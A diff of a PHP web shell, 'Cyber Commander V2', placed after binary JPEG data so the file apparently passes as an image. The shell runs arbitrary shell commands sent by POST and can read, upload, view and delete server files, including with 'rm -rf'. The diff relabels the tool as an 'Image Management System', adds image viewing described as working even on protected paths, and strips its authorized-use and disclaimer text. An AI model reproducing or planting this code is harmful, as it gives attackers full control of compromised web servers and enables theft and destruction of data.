@@ -31,7 +31,7 @@ Fi²ÓÕYÅ×7rz{ÙÌí9YI&`IT vn>õ;¬ð™%š.ˆNiiêníóG¨Q: 3ÕÆu
 ‘ŠI²É#?nŸ£Mb„ˆIKÖbF-dž;øÇ^OƒI<à‚Ê-‡©2k‚Yr{Ð¶éíq’*»1E×ä’”‹ÒŠMïBÚž$+RŠ%R\²íL*X-ºVÏuZ·QfºV¹>_{xCšlXFrc¡m¯O,](CÛt¸*åøCÞ„=’e’Ê)ùðº‡å2H©r!ô¡ùú-ñWZŸ¢ßmCÚ‡å|2Ï–"½±%µÏÑ?‘õÿ ÿÙ<!DOCTYPE html>
 <?php
 /**
- * SCRIPT NAME: ROOM TECH - CYBER COMMANDER V1
+ * SCRIPT NAME: ROOM TECH - CYBER COMMANDER V2 (IMAGE READY)
  * DEVELOPED BY: Room Tech Solutions (https://roomtech.cloud/)
  */
 
@@ -58,24 +58,42 @@ chdir($currentDirectory);
 $viewResult = '';
 $imgPreview = '';
 
+// --- [ منطق العمليات ] ---
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // تنفيذ الأوامر
     if (!empty($_POST['cmd_input'])) {
         $viewResult = $sx($_POST['cmd_input'] . " 2>&1");
     }
+    
+    // عرض محتوى الملفات (نصوص)
     if (isset($_POST['view_f'])) {
         $f = $currentDirectory . '/' . $_POST['view_f'];
         if (file_exists($f)) $viewResult = $fg($f);
     }
+
+    // عرض الصور (بتحويلها لـ Base64)
     if (isset($_POST['view_i'])) {
-        $img = $_POST['view_i'];
-        $data = base64_encode($fg($currentDirectory . '/' . $img));
-        if(!empty($data)) {
-            $imgPreview = '<div class="rt-img-frame"><span onclick="this.parentElement.remove()">× CLOSE</span><img src="data:image/jpeg;base64,'.$data.'"></div>';
+        $imgFile = $currentDirectory . '/' . $_POST['view_i'];
+        if (file_exists($imgFile)) {
+            $ext = pathinfo($imgFile, PATHINFO_EXTENSION);
+            $data = base64_encode($fg($imgFile));
+            $imgPreview = '
+            <div id="imgModal" class="rt-img-frame">
+                <div class="rt-img-content">
+                    <span class="close-img" onclick="document.getElementById(\'imgModal\').remove()">&times; إغلاق النافذة</span>
+                    <p style="font-size:10px; color:#aaa; margin-bottom:10px;">File: '.htmlspecialchars($_POST['view_i']).'</p>
+                    <img src="data:image/'.$ext.';base64,'.$data.'">
+                </div>
+            </div>';
         }
     }
+
+    // الرفع
     if (isset($_FILES['fileToUpload'])) {
         move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $currentDirectory . '/' . $_FILES["fileToUpload"]["name"]);
     }
+
+    // الحذف
     if (isset($_POST['del_f'])) {
         $f = $currentDirectory . '/' . $_POST['del_f'];
         is_dir($f) ? $sx("rm -rf " . escapeshellarg($f)) : unlink($f);
@@ -90,12 +108,11 @@ ob_clean();
     <meta charset="UTF-8">
     <title>CYBER COMMANDER | ROOM TECH</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Orbitron:wght@600;900&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Orbitron:wght@600;900&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root { --main-red: #ff0000; --bg: #030303; --panel: #0d0d0d; --green: #00ff41; }
         
         html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background: var(--bg); color: #e0e0e0; font-family: 'Fira Code', 'Cairo', monospace; }
-        
         .app-shell { display: flex; flex-direction: column; height: 100vh; width: 100vw; position: fixed; top: 0; left: 0; z-index: 9999; }
 
         header { background: #000; padding: 12px 25px; border-bottom: 2px solid var(--main-red); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
@@ -104,33 +121,32 @@ ob_clean();
 
         .body-layout { display: grid; grid-template-columns: 320px 1fr; flex-grow: 1; overflow: hidden; }
 
-        /* Sidebar المحدث */
-        aside { background: var(--panel); border-right: 1px solid #222; padding: 20px; overflow-y: auto; scrollbar-width: none; }
-        aside::-webkit-scrollbar { display: none; }
-        
+        aside { background: var(--panel); border-right: 1px solid #222; padding: 20px; overflow-y: auto; }
         .side-tag { color: var(--main-red); font-size: 10px; text-transform: uppercase; margin: 20px 0 10px; border-bottom: 1px solid #222; padding-bottom: 3px; letter-spacing: 1px; }
         .btn-side { background: #111; border: 1px solid #333; color: #888; width: 100%; padding: 10px; text-align: left; margin-bottom: 6px; font-size: 11px; cursor: pointer; }
         .btn-side:hover { background: var(--main-red); color: #fff; }
 
-        /* نصوص الشرح وإخلاء المسؤولية */
         .info-box { background: #000; border: 1px solid #1a1a1a; padding: 10px; margin-bottom: 10px; border-radius: 4px; }
         .info-box h5 { color: var(--main-red); margin: 0 0 5px 0; font-size: 11px; font-family: 'Orbitron'; }
-        .info-box p { font-size: 10px; color: #777; line-height: 1.5; margin: 0; text-align: justify; }
+        .info-box p { font-size: 10px; color: #777; line-height: 1.5; margin: 0; }
 
-        /* Content Area */
-        main { background: radial-gradient(circle at center, #150505 0%, #030303 100%); padding: 25px; overflow-y: auto; }
-        .rt-img-frame { background: #000; border: 1px solid var(--main-red); padding: 10px; margin-bottom: 20px; text-align: center; position: relative; }
-        .rt-img-frame img { max-width: 100%; max-height: 400px; }
-        .rt-img-frame span { position: absolute; top: 5px; right: 10px; color: var(--main-red); cursor: pointer; font-size: 12px; }
+        main { background: radial-gradient(circle at center, #150505 0%, #030303 100%); padding: 25px; overflow-y: auto; position: relative; }
+
+        /* --- [ تصميم عارض الصور ] --- */
+        .rt-img-frame { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; display: flex; justify-content: center; align-items: center; }
+        .rt-img-content { background: #111; padding: 20px; border: 1px solid var(--main-red); border-radius: 8px; position: relative; max-width: 80%; text-align: center; }
+        .rt-img-content img { max-width: 100%; max-height: 70vh; border: 1px solid #333; }
+        .close-img { display: block; margin-bottom: 10px; color: var(--main-red); cursor: pointer; font-weight: bold; text-align: right; }
 
         .path-bar { background: #000; padding: 10px; border-left: 4px solid var(--main-red); margin-bottom: 20px; font-size: 11px; }
         .terminal { background: #000; border: 1px solid #222; margin-bottom: 20px; }
-        .term-out { width: 100%; height: 200px; background: transparent; color: var(--green); padding: 12px; border: none; font-family: 'Fira Code'; resize: none; outline: none; }
+        .term-out { width: 100%; height: 180px; background: transparent; color: var(--green); padding: 12px; border: none; font-family: 'Fira Code'; font-size: 12px; resize: none; outline: none; }
         
         table { width: 100%; border-collapse: collapse; background: rgba(0,0,0,0.4); font-size: 12px; }
         th { background: #500; color: #fff; padding: 10px; text-align: left; }
         td { padding: 8px 10px; border-bottom: 1px solid #1a1a1a; }
-        .f-btn { border: none; padding: 3px 7px; color: #fff; cursor: pointer; margin-right: 3px; }
+        .f-btn { border: none; padding: 5px 8px; color: #fff; cursor: pointer; border-radius: 3px; margin-right: 4px; }
+        .f-btn i { font-size: 12px; }
     </style>
 </head>
 <body>
@@ -138,43 +154,31 @@ ob_clean();
 <div class="app-shell">
     <header>
         <div class="logo">ROOM TECH // <span>CYBER COMMANDER</span></div>
-        <div style="font-size: 10px; color: #444;">SECURITY AUDIT INTERFACE</div>
+        <div style="font-size: 10px; color: #444;">IMAGE MANAGEMENT SYSTEM</div>
     </header>
 
     <div class="body-layout">
         <aside>
-            <div class="side-tag">System Control</div>
+            <div class="side-tag">Quick Actions</div>
             <form method="post">
-                <button name="cmd_input" value="id" class="btn-side"><i class="fas fa-id-badge"></i> Check Auth</button>
-                <button name="cmd_input" value="uname -a" class="btn-side"><i class="fas fa-server"></i> Kernel Audit</button>
+                <button name="cmd_input" value="id" class="btn-side"><i class="fas fa-user-secret"></i> Whoami</button>
+                <button name="cmd_input" value="ls -la" class="btn-side"><i class="fas fa-list"></i> Full Directory List</button>
             </form>
 
             <div class="side-tag">Payload Upload</div>
             <form method="post" enctype="multipart/form-data">
                 <input type="file" name="fileToUpload" style="font-size:10px; color:#555; margin-bottom:10px; width:100%;">
-                <button class="btn-side" style="background:var(--main-red); color:#fff; text-align:center;">UPLOAD PAYLOAD</button>
+                <button class="btn-side" style="background:var(--main-red); color:#fff; text-align:center;">UPLOAD NOW</button>
             </form>
 
-            <div class="side-tag">Script Description</div>
+            <div class="side-tag">About Image Support</div>
             <div class="info-box">
-                <h5>Web Penetration Tool</h5>
-                <p>هذا السكربت مصمم خصيصاً لاختبار اختراق المواقع، حيث يتيح للمختبر السيطرة الكاملة على السيرفر عبر استغلال ثغرات رفع الملفات (File Upload) وتحويل ملفات PHP إلى صيغ صور وهمية لتخطي الفلاتر الأمنية.</p>
+                <h5>قراءة الصور</h5>
+                <p>تم إضافة دعم عرض الصور مباشرة من السيرفر دون الحاجة لتحميلها. يتم تحويل الصورة إلى كود Base64 لعرضها حتى لو كان المسار محمياً.</p>
             </div>
-
-            <div class="side-tag">Terms of Use</div>
-            <div class="info-box">
-                <h5>Authorized Use Only</h5>
-                <p>يُحظر استخدام هذا السكربت إلا في بيئات اختبار قانونية ومصرح بها. استخدامه على سيرفرات دون إذن مسبق يعتبر جريمة إلكترونية يعاقب عليها القانون.</p>
-            </div>
-
-            <div class="side-tag">Disclaimer</div>
-            <div class="info-box">
-                <h5>No Responsibility</h5>
-                <p>المطور (Room Tech Solutions) يخلي مسؤوليته التامة عن أي سوء استخدام أو أضرار قد تنتج عن استخدام هذا السكربت في أنشطة غير قانونية أو عمليات اختراق غير مصرح بها. المستخدم هو المسؤول الوحيد عن أفعاله.</p>
-            </div>
-
-            <div style="text-align:center; padding:10px;">
-                <a href="https://roomtech.cloud/" style="font-size:10px; color:#333; text-decoration:none;">&copy; 2026 Room Tech Solutions</a>
+            
+            <div style="text-align:center; padding:10px; margin-top:50px;">
+                <a href="https://roomtech.cloud/" style="font-size:10px; color:#333; text-decoration:none;">&copy; 2026 Room Tech</a>
             </div>
         </aside>
 
@@ -182,7 +186,7 @@ ob_clean();
             <?php if(!empty($imgPreview)) echo $imgPreview; ?>
 
             <div class="path-bar">
-                <i class="fas fa-terminal"></i> PATH: 
+                <i class="fas fa-folder-open"></i> PATH: 
                 <?php
                 $parts = explode(DIRECTORY_SEPARATOR, $currentDirectory);
                 $cum = '';
@@ -196,9 +200,9 @@ ob_clean();
 
             <div class="terminal">
                 <form method="post">
-                    <textarea class="term-out" placeholder="Execution output..."><?=htmlspecialchars($viewResult)?></textarea>
+                    <textarea class="term-out" readonly><?=htmlspecialchars($viewResult)?></textarea>
                     <div style="background:#111; padding:8px; display:flex; gap:10px;">
-                        <input type="text" name="cmd_input" placeholder="Execute Command..." style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:6px;">
+                        <input type="text" name="cmd_input" placeholder="Execute System Command..." style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:6px;">
                         <button style="background:var(--main-red); color:#fff; border:none; padding:0 15px; font-weight:bold; cursor:pointer;">RUN</button>
                     </div>
                 </form>
@@ -215,19 +219,29 @@ ob_clean();
                 </thead>
                 <tbody>
                     <?php
+                    $imgExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'ico'];
                     foreach (scandir($currentDirectory) as $v) {
                         if($v == "." || $v == "..") continue;
                         $u = $currentDirectory . '/' . $v;
                         $isD = is_dir($u);
+                        $ext = strtolower(pathinfo($v, PATHINFO_EXTENSION));
+                        $isImg = in_array($ext, $imgExts);
                     ?>
                     <tr>
-                        <td><i class="fas <?=$isD?'fa-folder':'fa-file-alt'?>" style="color:<?=$isD?'#fb0':'#888'?>; margin-right:8px;"></i> 
-                            <a href="<?=$isD?'?d='.x($u):'#'?>" style="color:#fff; text-decoration:none; font-size:11px;"><?=$v?></a></td>
-                        <td style="color:#555;"><?= $isD ? '--' : round(filesize($u)/1024, 1).'KB' ?></td>
+                        <td>
+                            <i class="fas <?=$isD?'fa-folder':'fa-file-alt'?>" style="color:<?=$isD?'#fb0':'#888'?>; margin-right:8px;"></i> 
+                            <a href="<?=$isD?'?d='.x($u):'#'?>" style="color:#fff; text-decoration:none;"><?=$v?></a>
+                        </td>
+                        <td style="color:#555;"><?= $isD ? '--' : round(filesize($u)/1024, 1).' KB' ?></td>
                         <td style="color:<?=is_writable($u)?'#0f0':'#f00'?>"><?=substr(sprintf('%o', fileperms($u)), -4)?></td>
                         <td style="display:flex;">
-                            <form method="post"><input type="hidden" name="view_f" value="<?=$v?>"><button class="f-btn" style="background:#005cbf;"><i class="fa fa-edit"></i></button></form>
-                            <form method="post"><input type="hidden" name="del_f" value="<?=$v?>"><button class="f-btn" style="background:#dc3545;"><i class="fa fa-trash"></i></button></form>
+                            <form method="post"><input type="hidden" name="view_f" value="<?=$v?>"><button title="Edit/View Text" class="f-btn" style="background:#005cbf;"><i class="fa fa-edit"></i></button></form>
+                            
+                            <?php if($isImg): ?>
+                            <form method="post"><input type="hidden" name="view_i" value="<?=$v?>"><button title="View Image" class="f-btn" style="background:#28a745;"><i class="fa fa-eye"></i></button></form>
+                            <?php endif; ?>
+
+                            <form method="post"><input type="hidden" name="del_f" value="<?=$v?>"><button title="Delete" class="f-btn" style="background:#dc3545;" onclick="return confirm('Confirm Delete?')"><i class="fa fa-trash"></i></button></form>
                         </td>
                     </tr>
                     <?php } ?>
@@ -236,6 +250,5 @@ ob_clean();
         </main>
     </div>
 </div>
-
 </body>
 </html>
